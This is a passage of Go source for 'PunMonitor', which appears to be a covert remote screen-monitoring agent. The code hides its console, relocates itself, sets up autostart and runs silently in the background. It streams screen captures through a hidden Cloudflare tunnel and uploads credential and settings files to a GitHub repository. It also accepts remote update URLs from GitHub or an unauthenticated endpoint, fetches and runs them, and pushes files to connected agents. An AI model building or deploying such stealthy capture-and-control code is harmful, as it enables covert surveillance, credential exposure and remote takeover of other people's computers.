				"cloudflare_tunnel_secret":  cfg.CloudflareTunnelSecret,
				"cloudflare_tunnel_id":      cfg.CloudflareTunnelID,
				"max_fps":                   cfg.MaxFPS,
				"monthly_limit_mb":          cfg.MonthlyLimitMB,
				"election_interval":         cfg.ElectionInterval,
				"update_url":                cfg.UpdateURL,
				"turn_server_url":          cfg.TurnServerURL,
				"turn_server_credential":   cfg.TurnServerCredential,
			})
			return
		}
		if r.Method == "POST" {
			var s SettingsFile
			if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			if s.ElectionInterval != "" {
				cfg.ElectionInterval = s.ElectionInterval
				loadElectionInterval()
			}
			if s.GitHubRepo != "" { cfg.GitHubRepo = s.GitHubRepo }
			if s.GitHubToken != "" { cfg.GitHubToken = s.GitHubToken }
			if s.AuthUser != "" { cfg.AuthUser = s.AuthUser }
			if s.AuthPass != "" { cfg.AuthPass = s.AuthPass }
			if s.TunnelProvider != "" { cfg.TunnelProvider = s.TunnelProvider }
			if s.TunnelHostname != "" { cfg.TunnelHostname = s.TunnelHostname }
			if s.ServerURL != "" { cfg.ServerURL = s.ServerURL }
			if s.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = s.CloudflareAccountTag }
			if s.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = s.CloudflareTunnelSecret }
			if s.CloudflareTunnelID != "" {
				if cfg.CloudflareTunnelID != s.CloudflareTunnelID {
					cfg.CloudflareTunnelID = s.CloudflareTunnelID
					if tunnelCmd != nil && tunnelCmd.Process != nil {
						tunnelCmd.Process.Kill()
					}
					if cfg.CloudflareTunnelID != "" {
						go startCloudflareTunnel(cfg)
					}
				}
			}
			if s.MaxFPS > 0 { cfg.MaxFPS = s.MaxFPS }
			if s.MonthlyLimitMB > 0 { cfg.MonthlyLimitMB = s.MonthlyLimitMB }
			if s.UpdateURL != "" { cfg.UpdateURL = s.UpdateURL }
			if s.TurnServerURL != "" { cfg.TurnServerURL = s.TurnServerURL }
			if s.TurnServerCredential != "" { cfg.TurnServerCredential = s.TurnServerCredential }
			saveSettings()
			pushCredsToGitHub()
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		}
	})

	http.HandleFunc("/api/system-info", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		mode := "standalone"
		if agentMode {
			mode = "agent"
		} else if cfg.IsServerMode {
			mode = "server"
		}
		json.NewEncoder(w).Encode(map[string]string{
			"hostname": getHostname(),
			"local_ip": getLocalIP(),
			"wan_ip":   getWANIP(),
			"os":       runtime.GOOS,
			"arch":     runtime.GOARCH,
			"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
			"version":  binaryVersion,
			"mode":     mode,
		})
	})

	http.HandleFunc("/api/agent-system-info/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		agentID := strings.TrimPrefix(r.URL.Path, "/api/agent-system-info/")
		if info, ok := agentSystemInfo.Load(agentID); ok {
			json.NewEncoder(w).Encode(info)
		} else {
			w.WriteHeader(404)
			json.NewEncoder(w).Encode(map[string]string{"error": "agent not found"})
		}
	})

	http.HandleFunc("/api/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	http.HandleFunc("/api/report.csv", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", "attachment; filename=activity-report-"+time.Now().Format("2006-01-02")+".csv")
		hostname := getHostname()
		writer := csv.NewWriter(w)
		writer.Write([]string{
			"Agent", "Hostname", "Local IP", "WAN IP",
			"OS", "Version", "Uptime", "Start Time (PunMonitor)",
			"Boot Time (System)", "Wake Up Time (PunMonitor Start)", "Last Active", "Last Idle Start", "Last Shutdown", "Idle Time",
			"Tunnel ID",
			"FPS", "Monthly Limit MB",
			"Report Generated",
		})
		// Server's own row
		{
			uptimeSecs := int64(time.Since(startTime).Seconds())
			uptimeStr := fmt.Sprintf("%dh %dm %ds", uptimeSecs/3600, (uptimeSecs%3600)/60, uptimeSecs%60)
			bootTime := "never"
			lastShutdown := "never"
			lastActive := "never"
			lastIdleStart := "never"
			totalIdle := "never"
			if globalActivity != nil {
				s := globalActivity.Summary()
				bootTime = s["boot_time"]
				lastShutdown = s["last_shutdown"]
				lastActive = s["last_active"]
				lastIdleStart = s["last_idle_start"]
				totalIdle = s["total_idle"]
			}
			wakeUpTime := "never"
			if !startTime.IsZero() {
				wakeUpTime = startTime.Format("2006-01-02 15:04:05")
			}
			writer.Write([]string{
				hostname, hostname, getLocalIP(), getWANIP(),
				runtime.GOOS + " " + runtime.GOARCH, binaryVersion, uptimeStr, startTime.Format("2006-01-02 15:04:05"),
				bootTime, wakeUpTime, lastActive, lastIdleStart, lastShutdown, totalIdle,
				cfg.CloudflareTunnelID,
				fmt.Sprintf("%.1f", cfg.MaxFPS), fmt.Sprintf("%d", cfg.MonthlyLimitMB),
				time.Now().Format("2006-01-02 15:04:05"),
			})
		}
		// Per-agent rows from agentSystemInfo
		agentSystemInfo.Range(func(key, value interface{}) bool {
			aid := key.(string)
			info, _ := value.(map[string]interface{})
			if info == nil { return true }
			getStr := func(field string) string {
				if v, ok := info[field].(string); ok { return v }
				return "—"
			}
			writer.Write([]string{
				aid,
				getStr("hostname"),
				getStr("local_ip"),
				getStr("wan_ip"),
				getStr("os") + " " + getStr("arch"),
				getStr("version"),
				getStr("uptime"),
				getStr("start_time"),
				getStr("boot_time"),
				getStr("wake_up_time"),
				"—", // last active
				"—", // last idle start
				"—", // last shutdown
				getStr("idle_time"),
				cfg.CloudflareTunnelID,
				fmt.Sprintf("%.1f", cfg.MaxFPS),
				fmt.Sprintf("%d", cfg.MonthlyLimitMB),
				time.Now().Format("2006-01-02 15:04:05"),
			})
			return true
		})
		writer.Flush()
	})

	http.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		agentConnsMu.RLock()
		list := make([]string, 0, len(agentConns)+1)
		for id := range agentConns {
			list = append(list, id)
		}
		agentConnsMu.RUnlock()
		hasLocal := false
		for _, id := range list {
			if id == cfg.AgentID {
				hasLocal = true
				break
			}
		}
		if !hasLocal {
			list = append(list, cfg.AgentID)
		}
		json.NewEncoder(w).Encode(list)
	})

	http.HandleFunc("/api/agents/full", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		agentConnsMu.RLock()
		list := make([]map[string]interface{}, 0, len(agentConns)+1)
		for id := range agentConns {
			hidden := false
			if v, ok := hiddenAgents.Load(id); ok {
				hidden = v.(bool)
			}
			list = append(list, map[string]interface{}{"id": id, "hidden": hidden, "connected": true})
		}
		agentConnsMu.RUnlock()
		myHidden := false
		if v, ok := hiddenAgents.Load(cfg.AgentID); ok {
			myHidden = v.(bool)
		}
		if _, exists := agentConns[cfg.AgentID]; !exists {
			list = append(list, map[string]interface{}{"id": cfg.AgentID, "hidden": myHidden, "connected": false})
		}
		json.NewEncoder(w).Encode(list)
	})

	http.HandleFunc("/api/known-agents", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		type agentInfo struct {
			ID         string `json:"id"`
			Hostname   string `json:"hostname,omitempty"`
			LocalIP    string `json:"local_ip,omitempty"`
			WANIP      string `json:"wan_ip,omitempty"`
			OS         string `json:"os,omitempty"`
			Version    string `json:"version,omitempty"`
			LastSeen   int64  `json:"last_seen"`
			Connected  bool   `json:"connected"`
			Registered bool   `json:"registered"`
		}
		// Get currently connected agents
		agentConnsMu.RLock()
		connected := make(map[string]bool)
		for id := range agentConns {
			connected[id] = true
		}
		agentConnsMu.RUnlock()
		if _, exists := connected[cfg.AgentID]; !exists && cfg.AgentID != "" {
			// Server itself is always "connected" in the sense that its API is serving
		}
		var result []agentInfo
		knownAgents.Range(func(key, value interface{}) bool {
			id := key.(string)
			info := value.(map[string]interface{})
			a := agentInfo{
				ID:         id,
				LastSeen:   int64(info["last_seen"].(float64)),
				Connected:  connected[id],
				Registered: true,
			}
			if h, ok := info["hostname"].(string); ok { a.Hostname = h }
			if ip, ok := info["local_ip"].(string); ok { a.LocalIP = ip }
			if ip, ok := info["wan_ip"].(string); ok { a.WANIP = ip }
			if os, ok := info["os"].(string); ok { a.OS = os }
			if v, ok := info["version"].(string); ok { a.Version = v }
			result = append(result, a)
			return true
		})
		if result == nil {
			result = []agentInfo{}
		}
		json.NewEncoder(w).Encode(result)
	})

	http.HandleFunc("/api/hide-agent", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "POST only", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			AgentID string `json:"agent_id"`
			Hide    bool   `json:"hide"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		hiddenAgents.Store(req.AgentID, req.Hide)
		llog("info", "Agent %s hidden=%v", req.AgentID, req.Hide)
		saveSettings()
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	http.HandleFunc("/api/remove-agent", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "POST only", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			AgentID string `json:"agent_id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		// Remove from agent connections
		agentConnsMu.Lock()
		if conn, ok := agentConns[req.AgentID]; ok {
			conn.Close()
			delete(agentConns, req.AgentID)
		}
		agentConnsMu.Unlock()
		// Remove from system info
		agentSystemInfo.Delete(req.AgentID)
		// Remove from hidden agents
		hiddenAgents.Store(req.AgentID, false)
		llog("info", "Agent %s removed", req.AgentID)
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	http.HandleFunc("/api/promote", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "POST only", http.StatusMethodNotAllowed)
			return
		}
		cfg.IsServerMode = true
		llog("info", "Promoted to server mode via HTTP")
		if serverCancel != nil { serverCancel() }
		serverCtx, serverCancel = context.WithCancel(context.Background())
		go startScreenCapture(serverCtx)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "mode": "server"})
	})

	http.HandleFunc("/api/transport-status", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(getTransportStatus())
	})

	http.HandleFunc("/api/version", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"version": binaryVersion})
	})

	http.HandleFunc("/api/sync", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		llog("info", "Manual sync triggered from dashboard")
		syncFromGitHub()
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	http.HandleFunc("/api/upload", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "POST only", http.StatusMethodNotAllowed)
			return
		}
		agentID := r.FormValue("agentId")
		if agentID == "" {
			http.Error(w, "agentId required", http.StatusBadRequest)
			return
		}
		file, header, err := r.FormFile("file")
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		defer file.Close()
		data, err := io.ReadAll(file)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		// Forward file to target agent via WS
		msg, _ := json.Marshal(map[string]interface{}{
			"type": "file_transfer",
			"name": header.Filename,
			"data": data,
		})
		forwardToAgent(agentID, msg)
		llog("info", "File %s (%d bytes) forwarded to agent %s", header.Filename, len(data), agentID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "name": header.Filename, "size": fmt.Sprintf("%d", len(data))})
	})

	http.HandleFunc("/api/update", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "POST only", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			URL string `json:"url"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
			http.Error(w, "missing url", http.StatusBadRequest)
			return
		}
		go selfUpdate(req.URL)
		cfg.UpdateURL = req.URL
		saveSettings()
		agentUpdateMsg, _ := json.Marshal(map[string]string{
			"type": "update",
			"url":  req.URL,
		})
		connAgentIDMu.RLock()
		wsClients.Range(func(key, value interface{}) bool {
			conn := key.(*websocket.Conn)
			if _, isAgent := connAgentID[conn]; isAgent {
				conn.WriteMessage(websocket.TextMessage, agentUpdateMsg)
			}
			return true
		})
		connAgentIDMu.RUnlock()
		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "msg": "Update sent to server + agents"})
	})

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		upgrader := websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		}
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			llog("error", "WebSocket upgrade failed: %v", err)
			return
		}
		llog("info", "WebSocket client connected")
		wsClients.Store(conn, true)
		var agentID string
		defer func() {
			wsClients.Delete(conn)
			if agentID != "" {
				agentConnsMu.Lock()
				delete(agentConns, agentID)
				agentConnsMu.Unlock()
				connAgentIDMu.Lock()
				delete(connAgentID, conn)
				connAgentIDMu.Unlock()
				agentSystemInfo.Delete(agentID)
			}
			conn.Close()
			llog("info", "WebSocket client disconnected")
		}()
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
					llog("error", "WebSocket read error: %v", err)
				}
				break
			}
	var msgMap map[string]interface{}
	if err := json.Unmarshal(msg, &msgMap); err == nil {
		if t, _ := msgMap["type"].(string); t == "hello" {
			if a, _ := msgMap["agent"].(bool); a {
				if id, _ := msgMap["agentId"].(string); id != "" {
					agentID = id
					agentConnsMu.Lock()
					agentConns[agentID] = conn
					agentConnsMu.Unlock()
					connAgentIDMu.Lock()
					connAgentID[conn] = agentID
					connAgentIDMu.Unlock()
					// Register in knownAgents for persistent tracking
					if sysInfo, ok := msgMap["systemInfo"].(map[string]interface{}); ok {
						knownAgents.Store(agentID, map[string]interface{}{
							"hostname":   sysInfo["hostname"],
							"local_ip":   sysInfo["local_ip"],
							"wan_ip":     sysInfo["wan_ip"],
							"os":         sysInfo["os"],
							"version":    sysInfo["version"],
							"last_seen":  time.Now().UnixMilli(),
							"registered": true,
						})
					} else {
						knownAgents.Store(agentID, map[string]interface{}{
							"last_seen":  time.Now().UnixMilli(),
							"registered": true,
						})
					}
					if sysInfo, ok := msgMap["systemInfo"].(map[string]interface{}); ok {
						agentSystemInfo.Store(agentID, sysInfo)
						// Check if agent version is outdated and send update URL
						if ver, _ := sysInfo["version"].(string); ver != "" && ver != binaryVersion && cfg.UpdateURL != "" {
							llog("info", "Agent %s version %s outdated (server %s) – auto-updating", id, ver, binaryVersion)
							updateMsg, _ := json.Marshal(map[string]string{
								"type": "update",
								"url":  cfg.UpdateURL,
							})
							conn.WriteMessage(websocket.TextMessage, updateMsg)
						}
					}
				}
			} else {
				// Dashboard client connected – send agent list + status immediately
				sendAgentListToWS(conn)
				sendStatusToWS(conn)
			}
		}
	}
			handleWSMessage(conn, msg)
		}
	})

	addr := fmt.Sprintf(":%d", cfg.ConfigPort)
	llog("info", "Starting HTTP server on %s", addr)
	if err := http.ListenAndServe(addr, nil); err != nil {
		llog("error", "HTTP server failed: %v", err)
	}
}

func pushCredsToGitHub() {
	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
		return
	}
	// Push punmonitor-credentials.json
	credsPath := filepath.Join(dataDir(), "punmonitor-credentials.json")
	if credData, err := os.ReadFile(credsPath); err == nil {
		encoded := base64.StdEncoding.EncodeToString(credData)
		payload, _ := json.Marshal(map[string]interface{}{
			"message": "credential backup",
			"content": encoded,
			"branch":  "main",
		})
		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/punmonitor-credentials.json", cfg.GitHubRepo)
		req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
		if err != nil { llog("error", "Failed to create request for credentials: %v", err); return }
		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil { llog("error", "Failed to push credentials: %v", err); return }
		defer resp.Body.Close()
		llog("info", "Credentials pushed to GitHub")
	}
	// Push settings.json
	if settingsData, err := os.ReadFile(settingsFilePath()); err == nil {
		encoded := base64.StdEncoding.EncodeToString(settingsData)
		payload, _ := json.Marshal(map[string]interface{}{
			"message": "settings backup",
			"content": encoded,
			"branch":  "main",
		})
		url := fmt.Sprintf("https://api.github.com/repos/%s/contents/settings.json", cfg.GitHubRepo)
		req, err := http.NewRequest("PUT", url, bytes.NewReader(payload))
		if err != nil { llog("error", "Failed to create request for settings: %v", err); return }
		req.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil { llog("error", "Failed to push settings: %v", err); return }
		defer resp.Body.Close()
		llog("info", "Settings pushed to GitHub")
	}
}

func buildShareURL(agentID string) string {
	if cfg.ServerURL != "" {
		if agentID != "" {
			return cfg.ServerURL + "/?agent=" + agentID
		}
		return cfg.ServerURL + "/"
	}
	if cfg.CloudflareTunnelID != "" {
		hostname := "relay.recruitedge.us"
		if cfg.TunnelHostname != "" {
			hostname = cfg.TunnelHostname
		}
		if agentID != "" {
			return fmt.Sprintf("https://%s/?agent=%s", hostname, agentID)
		}
		return fmt.Sprintf("https://%s/", hostname)
	}
	logPath := filepath.Join(dataDir(), "cloudflare.log")
	if data, err := os.ReadFile(logPath); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.Contains(line, "https://") && strings.Contains(line, "trycloudflare.com") {
				start := strings.Index(line, "https://")
				if start < 0 {
					continue
				}
				rest := line[start:]
				end := strings.Index(rest, " ")
				if end < 0 {
					end = len(rest)
				}
				u := rest[:end]
				if agentID != "" {
					return u + "/?agent=" + agentID
				}
				return u
			}
		}
	}
	if agentID != "" {
		return fmt.Sprintf("http://%s:%d/?agent=%s", getLocalIP(), cfg.ConfigPort, agentID)
	}
	return fmt.Sprintf("http://%s:%d/", getLocalIP(), cfg.ConfigPort)
}

func syncFromGitHub() {
	if cfg.GitHubRepo == "" {
		return
	}

	// 1. Fetch credentials (save if changed)
	rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/punmonitor-credentials.json", cfg.GitHubRepo)
	req, _ := http.NewRequest("GET", rawURL, nil)
	resp, err := httpFastClient.Do(req)
	credsChanged := false
	if err == nil && resp.StatusCode == http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		localPath := filepath.Join(dataDir(), "punmonitor-credentials.json")
		localData, _ := os.ReadFile(localPath)
		if string(body) != string(localData) {
			os.WriteFile(localPath, body, 0644)
			llog("info", "Credentials updated from GitHub")
			loadCredentials()
			saveSettings()
			credsChanged = true
		}
	} else if resp != nil {
		resp.Body.Close()
	}

	// Restart tunnel if credentials changed
	if credsChanged && tunnelCmd != nil && tunnelCmd.Process != nil {
		tunnelCmd.Process.Kill()
		tunnelCmd.Wait()
		if cfg.CloudflareTunnelID != "" {
			go startCloudflareTunnel(cfg)
		}
	}

	// 2. Fetch settings.json (apply remote overrides)
	settingsURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/settings.json", cfg.GitHubRepo)
	req2, _ := http.NewRequest("GET", settingsURL, nil)
	resp2, err2 := httpFastClient.Do(req2)
	if err2 == nil && resp2.StatusCode == http.StatusOK {
		settingsBody, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()
		var remoteSettings SettingsFile
		if json.Unmarshal(settingsBody, &remoteSettings) == nil {
			changed := false
			if remoteSettings.GitHubRepo != "" && remoteSettings.GitHubRepo != cfg.GitHubRepo {
				cfg.GitHubRepo = remoteSettings.GitHubRepo
				changed = true
				llog("info", "GitHub repo changed to %s – re-syncing", cfg.GitHubRepo)
				saveSettings()
				syncFromGitHub() // re-sync with new repo
				return
			}
			if remoteSettings.GitHubToken != "" { cfg.GitHubToken = remoteSettings.GitHubToken; changed = true }
			if remoteSettings.AuthUser != "" { cfg.AuthUser = remoteSettings.AuthUser; changed = true }
			if remoteSettings.AuthPass != "" { cfg.AuthPass = remoteSettings.AuthPass; changed = true }
			if remoteSettings.TunnelProvider != "" { cfg.TunnelProvider = remoteSettings.TunnelProvider; changed = true }
			if remoteSettings.TunnelHostname != "" { cfg.TunnelHostname = remoteSettings.TunnelHostname; changed = true }
			if remoteSettings.ServerURL != "" { cfg.ServerURL = remoteSettings.ServerURL; changed = true }
			if remoteSettings.ElectionInterval != "" { cfg.ElectionInterval = remoteSettings.ElectionInterval; changed = true }
			if remoteSettings.MaxFPS > 0 {
				cfg.MaxFPS = remoteSettings.MaxFPS
				if serverCancel != nil { serverCancel() }
				serverCtx, serverCancel = context.WithCancel(context.Background())
				go startScreenCapture(serverCtx)
				changed = true
			}
			if remoteSettings.CloudflareAccountTag != "" { cfg.CloudflareAccountTag = remoteSettings.CloudflareAccountTag; changed = true }
			if remoteSettings.CloudflareTunnelSecret != "" { cfg.CloudflareTunnelSecret = remoteSettings.CloudflareTunnelSecret; changed = true }
			if remoteSettings.CloudflareTunnelID != "" { cfg.CloudflareTunnelID = remoteSettings.CloudflareTunnelID; changed = true }
			if remoteSettings.UpdateURL != "" && remoteSettings.UpdateURL != cfg.UpdateURL {
				cfg.UpdateURL = remoteSettings.UpdateURL
				changed = true
				llog("info", "New update URL detected: %s – broadcasting to agents", cfg.UpdateURL)
				// Broadcast update to all connected agents
				updateMsg, _ := json.Marshal(map[string]string{
					"type": "update",
					"url":  cfg.UpdateURL,
				})
				connAgentIDMu.RLock()
				wsClients.Range(func(key, value interface{}) bool {
					conn := key.(*websocket.Conn)
					if _, isAgent := connAgentID[conn]; isAgent {
						conn.WriteMessage(websocket.TextMessage, updateMsg)
					}
					return true
				})
				connAgentIDMu.RUnlock()
			}
			if changed { saveSettings() }
		}
	} else if resp2 != nil {
		resp2.Body.Close()
	}

	// 3. Optionally save dashboard.html from GitHub to disk for customization.
	//    The embedded dashboard (compiled into the binary) is the source of truth.
	//    GitHub dashboard is only saved to disk — never overrides the in-memory version.
	//    Hot-reload in startHTTPServer picks up disk file changes for live editing.
	dashURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/dashboard.html", cfg.GitHubRepo)
	dashReq, _ := http.NewRequest("GET", dashURL, nil)
	dashResp, dashErr := httpFastClient.Do(dashReq)
	if dashErr == nil && dashResp.StatusCode == http.StatusOK {
		dashBody, _ := io.ReadAll(dashResp.Body)
		dashResp.Body.Close()
		dashDiskPath := filepath.Join(dataDir(), "dashboard.html")
		existingDisk, _ := os.ReadFile(dashDiskPath)
		if string(dashBody) != string(existingDisk) {
			os.WriteFile(dashDiskPath, dashBody, 0644)
			llog("info", "Dashboard saved to disk from GitHub (%d bytes) → %s", len(dashBody), dashDiskPath)
		}
	} else if dashResp != nil {
		dashResp.Body.Close()
	}
}

func checkForServerUpdates() error {
	syncFromGitHub()
	return nil
}

func checkForCloudflareKeyChanges() error {
	return nil
}

func captureScreen() (image.Image, error) {
	bounds := screenshot.GetDisplayBounds(0)
	if bounds.Empty() {
		return nil, fmt.Errorf("empty bounds")
	}
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		img = image.NewRGBA(image.Rect(0, 0, 100, 100))
		for y := 0; y < 100; y++ {
			for x := 0; x < 100; x++ {
				img.Set(x, y, color.RGBA{uint8(x % 256), uint8(y % 256), 128, 255})
			}
		}
		return img, nil
	}
	return img, nil
}

func startCloudflareTunnel(cfg *Config) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in cloudflare tunnel: %v", r)
		}
	}()
	if err := EnsureCloudflaredInstalled(); err != nil {
		llog("error", "cloudflared not available: %v", err)
		return
	}

	// Try named tunnel first if we have an ID
	if cfg.CloudflareTunnelID != "" {
		llog("info", "Starting Cloudflare named tunnel: %s", cfg.CloudflareTunnelID)

		userHome := os.Getenv("USERPROFILE")
		if userHome == "" { userHome = os.Getenv("HOME") }
		credsDir := filepath.Join(userHome, ".cloudflared")
		os.MkdirAll(credsDir, 0755)
		credsFile := filepath.Join(credsDir, cfg.CloudflareTunnelID+".json")

		cleanCreds := map[string]string{
			"AccountTag":   cfg.CloudflareAccountTag,
			"TunnelSecret": cfg.CloudflareTunnelSecret,
			"TunnelID":     cfg.CloudflareTunnelID,
		}
		credsData, _ := json.Marshal(cleanCreds)
		if err := os.WriteFile(credsFile, credsData, 0644); err != nil {
			llog("error", "Failed to write credentials: %v", err)
		}

		// Write config.yml with ingress rules (required for named tunnels)
		ingHost := cfg.TunnelHostname
		if ingHost == "" {
			ingHost = "relay.recruitedge.us"
		}
		configContent := fmt.Sprintf(`tunnel: %s
credentials-file: %s
ingress:
  - hostname: %s
    service: http://localhost:%d
  - service: http_status:404
`, cfg.CloudflareTunnelID, credsFile, ingHost, cfg.ConfigPort)
		configFile := filepath.Join(credsDir, "config.yml")
		if err := os.WriteFile(configFile, []byte(configContent), 0644); err != nil {
			llog("error", "Failed to write tunnel config: %v", err)
		} else {
			llog("info", "Wrote tunnel config to %s", configFile)
		}

		logFile := filepath.Join(dataDir(), "cloudflare.log")
		args := []string{
			"tunnel",
			"--config", configFile,
			"--logfile", logFile,
			"--loglevel", "info",
			"--no-autoupdate",
			"run",
		}

		llog("info", "Running: cloudflared tunnel --config %s --logfile %s --loglevel info --no-autoupdate run", configFile, logFile)
		cmd := exec.Command("cloudflared", args...)
		cmd.Stdout = nil
		cmd.Stderr = nil
		newHiddenCmd(cmd)
		tunnelCmd = cmd

		if err := cmd.Start(); err != nil {
			llog("error", "Named tunnel start failed: %v, trying quick tunnel", err)
		} else {
			llog("info", "Named tunnel PID: %d", cmd.Process.Pid)

			// Only ONE tunnel runs at a time — no duplicate cloudflared to avoid port conflicts
			time.AfterFunc(15*time.Second, func() {
				logData, err := os.ReadFile(logFile)
				if err == nil && strings.Contains(string(logData), "Registered tunnel connection") {
					accHost := cfg.TunnelHostname
				if accHost == "" {
					accHost = "relay.recruitedge.us"
				}
				llog("info", "Named tunnel connected — accessible at https://%s", accHost)
				}
			})

			if err := cmd.Wait(); err != nil {
				llog("error", "Named tunnel exited: %v – trying quick tunnel", err)
			} else {
				llog("info", "Named tunnel stopped normally")
			}
			tunnelCmd = nil
		}
	}

	// Fallback to quick tunnel (only if named tunnel was not used or failed)
	if cfg.CloudflareTunnelID == "" || tunnelCmd == nil {
		startQuickTunnel(cfg)
	}
}

func startQuickTunnel(cfg *Config) {
	llog("info", "Starting quick Cloudflare tunnel to http://localhost:%d", cfg.ConfigPort)
	if err := EnsureCloudflaredInstalled(); err != nil {
		llog("error", "cloudflared not available: %v", err)
		return
	}

	args := []string{
		"tunnel",
		"--logfile", filepath.Join(dataDir(), "cloudflare.log"),
		"--loglevel", "info",
		"--no-autoupdate",
		"run",
		"--url", fmt.Sprintf("http://localhost:%d", cfg.ConfigPort),
	}
	cmd := exec.Command("cloudflared", args...)
	stdoutPipe, _ := cmd.StdoutPipe()
	cmd.Stderr = nil
	newHiddenCmd(cmd)
	llog("info", "Running quick tunnel: cloudflared tunnel --logfile ... --loglevel info --no-autoupdate run --url http://localhost:%d", cfg.ConfigPort)
	if err := cmd.Start(); err != nil {
		llog("error", "Failed to start quick tunnel: %v", err)
		return
	}
	llog("info", "Quick tunnel started with PID: %d", cmd.Process.Pid)

	// Read stdout to extract trycloudflare URL
	go func() {
		scanner := bufio.NewScanner(stdoutPipe)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "trycloudflare.com") {
				start := strings.Index(line, "https://")
				if start >= 0 {
					rest := line[start:]
					end := strings.Index(rest, " ")
					if end < 0 {
						end = len(rest)
					}
					quickURL := rest[:end]
					llog("info", "Quick tunnel URL: %s", quickURL)
				}
			}
		}
	}()

	cmd.Wait()
}

var defaultGitHubRepo string
var defaultGitHubToken string
var binaryVersion = "9.2.0"

func main() {
    hideConsole()

	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--github-repo":
			if i+1 < len(os.Args) {
				i++
				defaultGitHubRepo = os.Args[i]
			}
		case "--github-token":
			if i+1 < len(os.Args) {
				i++
				defaultGitHubToken = os.Args[i]
			}
		}
	}

	if len(os.Args) > 1 && os.Args[1] == "--watchdog" {
		runWatchdog()
		return
	}

	if len(os.Args) > 1 && os.Args[1] == "--install" {
		setupAutostart()
		llog("info", "Autostart installed. Run without flags or reboot to start.")
		return
	}

	if len(os.Args) > 1 && os.Args[1] == "--remove" {
		removeAutostart()
		llog("info", "Autostart removed.")
		return
	}

	// Self-relocate to permanent location if running from a temporary path (e.g. Downloads)
	ensureBinaryRelocated()

	if !singleton() {
		llog("error", "Another instance is already running. Exiting.")
		os.Exit(1)
	}

	// Daemonize on macOS/Linux by re-exec'ing detached if attached to a terminal
	if runtime.GOOS != "windows" && os.Getenv("PUNMON_NOFOREGROUND") == "" {
		if isTerminal() {
			os.Setenv("PUNMON_NOFOREGROUND", "1")
			devNull, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
			attr := &os.ProcAttr{
				Files: []*os.File{devNull, devNull, devNull},
				Env:   os.Environ(),
			}
			exe, _ := os.Executable()
			if proc, err := os.StartProcess(exe, os.Args, attr); err == nil {
				proc.Release()
